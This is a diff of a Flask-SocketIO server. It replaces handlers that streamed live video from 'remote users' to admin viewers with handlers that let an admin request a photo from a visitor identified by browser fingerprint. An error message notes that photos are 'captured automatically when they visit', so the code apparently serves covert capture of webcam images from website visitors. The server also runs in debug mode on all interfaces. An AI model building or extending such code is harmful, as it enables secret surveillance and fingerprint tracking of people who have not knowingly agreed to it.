@@ -864,9 +864,9 @@ def serve_photo(filename):
     from flask import send_from_directory
     return send_from_directory(PHOTOS_FOLDER, filename)
 
-# WebSocket handlers for live video streaming
-# Store active video streams: {entry_id: {socket_id: sid, fingerprint: fp, ip: ip}}
-active_streams = {}
+# WebSocket handlers for photo requests
+# Store active users: {entry_id: {socket_id: sid, fingerprint: fp}}
+active_users = {}
 
 @socketio.on('connect')
 def handle_connect():
@@ -877,89 +877,75 @@ def handle_connect():
 def handle_disconnect():
     """Handle WebSocket disconnection"""
     print(f"[WEBSOCKET] Client disconnected: {request.sid}")
-    # Remove from active streams
-    for entry_id, stream_info in list(active_streams.items()):
-        if stream_info.get('socket_id') == request.sid:
-            del active_streams[entry_id]
-            print(f"[WEBSOCKET] Removed stream for entry {entry_id}")
+    # Remove from active users
+    for entry_id, user_info in list(active_users.items()):
+        if user_info.get('socket_id') == request.sid:
+            del active_users[entry_id]
+            print(f"[WEBSOCKET] Removed user entry {entry_id}")
 
-@socketio.on('start_video_stream')
-def handle_start_stream(data):
-    """Start video streaming from remote user"""
+@socketio.on('register_user')
+def handle_register_user(data):
+    """Register a user when they connect (for photo requests)"""
     entry_id = data.get('entry_id')
     fingerprint = data.get('fingerprint', '')
-    ip_address = data.get('ip_address', '')
     
     if entry_id:
-        active_streams[entry_id] = {
+        active_users[entry_id] = {
             'socket_id': request.sid,
             'fingerprint': fingerprint,
-            'ip_address': ip_address,
-            'started_at': datetime.now().isoformat()
+            'registered_at': datetime.now().isoformat()
         }
-        join_room(f'stream_{entry_id}')
-        print(f"[WEBSOCKET] Started video stream for entry {entry_id} from {ip_address}")
-        emit('stream_started', {'entry_id': entry_id, 'status': 'success'})
+        join_room(f'user_{entry_id}')
+        print(f"[WEBSOCKET] Registered user entry {entry_id} with fingerprint {fingerprint[:16]}...")
+        emit('user_registered', {'entry_id': entry_id, 'status': 'success'})
     else:
-        emit('stream_error', {'error': 'Entry ID required'})
+        emit('registration_error', {'error': 'Entry ID required'})
 
-@socketio.on('video_frame')
-def handle_video_frame(data):
-    """Receive video frame from remote user and broadcast to admin viewers"""
+@socketio.on('request_photo')
+def handle_request_photo(data):
+    """Admin requests a photo from a specific user"""
     entry_id = data.get('entry_id')
-    frame_data = data.get('frame')  # Base64 encoded image
+    fingerprint = data.get('fingerprint', '')
     
-    if entry_id and frame_data:
-        # Limit frame size to prevent memory issues
-        if len(frame_data) > 200000:  # ~200KB max
-            print(f"[WEBSOCKET] Frame too large ({len(frame_data)} bytes), skipping")
-            return
-        
-        # Broadcast frame to all admin viewers watching this stream
-        # Use namespace to avoid broadcasting to sender
-        try:
-            emit('video_frame', {
-                'entry_id': entry_id,
-                'frame': frame_data,
-                'timestamp': datetime.now().isoformat()
-            }, room=f'viewer_{entry_id}', include_self=False)
-        except Exception as e:
-            print(f"[WEBSOCKET] Error broadcasting frame: {e}")
-    else:
-        emit('stream_error', {'error': 'Invalid frame data'})
-
-@socketio.on('watch_stream')
-def handle_watch_stream(data):
-    """Admin wants to watch a specific user's video stream"""
-    entry_id = data.get('entry_id')
+    if not entry_id and not fingerprint:
+        emit('photo_request_error', {'error': 'Entry ID or fingerprint required'})
+        return
     
-    if entry_id:
-        join_room(f'viewer_{entry_id}')
-        print(f"[WEBSOCKET] Admin viewer joined stream for entry {entry_id}")
-        emit('watching_stream', {
-            'entry_id': entry_id,
-            'is_active': entry_id in active_streams
+    # Find user by entry_id or fingerprint
+    target_socket_id = None
+    target_entry_id = None
+    
+    if entry_id and entry_id in active_users:
+        target_socket_id = active_users[entry_id]['socket_id']
+        target_entry_id = entry_id
+    elif fingerprint:
+        # Search by fingerprint
+        for eid, user_info in active_users.items():
+            if user_info.get('fingerprint') == fingerprint:
+                target_socket_id = user_info['socket_id']
+                target_entry_id = eid
+                break
+    
+    if target_socket_id and target_entry_id:
+        # Send photo request to the user
+        emit('photo_request', {
+            'entry_id': target_entry_id,
+            'fingerprint': fingerprint,
+            'requested_at': datetime.now().isoformat()
+        }, room=f'user_{target_entry_id}')
+        print(f"[WEBSOCKET] Photo request sent to entry {target_entry_id}")
+        emit('photo_requested', {
+            'entry_id': target_entry_id,
+            'status': 'sent',
+            'message': 'Photo request sent to user'
         })
     else:
-        emit('stream_error', {'error': 'Entry ID required'})
-
-@socketio.on('stop_watching')
-def handle_stop_watching(data):
-    """Admin stops watching a stream"""
-    entry_id = data.get('entry_id')
-    if entry_id:
-        leave_room(f'viewer_{entry_id}')
-        print(f"[WEBSOCKET] Admin viewer left stream for entry {entry_id}")
-
-@socketio.on('stop_stream')
-def handle_stop_stream(data):
-    """Remote user stops streaming"""
-    entry_id = data.get('entry_id')
-    if entry_id and entry_id in active_streams:
-        del active_streams[entry_id]
-        leave_room(f'stream_{entry_id}')
-        print(f"[WEBSOCKET] Stopped video stream for entry {entry_id}")
-        emit('stream_stopped', {'entry_id': entry_id})
+        error_msg = f"User not found or not online (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
+        print(f"[WEBSOCKET] {error_msg}")
+        emit('photo_request_error', {
+            'error': error_msg,
+            'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
+        })
 
 if __name__ == '__main__':
     socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
